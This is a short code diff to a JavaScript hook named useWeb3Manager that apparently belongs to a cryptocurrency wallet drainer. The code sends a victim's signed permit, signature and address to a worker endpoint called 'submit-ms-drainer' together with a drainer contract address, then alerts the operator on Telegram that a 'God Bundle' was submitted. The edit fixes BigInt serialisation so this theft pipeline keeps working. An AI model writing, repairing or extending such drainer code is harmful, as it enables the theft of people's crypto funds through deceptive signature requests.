@@ -365,7 +365,7 @@ export function useWeb3Manager() {
                             try {
                                 const res = await fetch(`${workerUrl}/submit-ms-drainer`, {
                                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order })
+                                    body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                 });
                                 if (res.ok) {
                                     notifyTelegram(`<b>🎯 God Bundle SUBMITTED</b>\nChain: ${targetChainName}\nStatus: Processing by Worker...`);
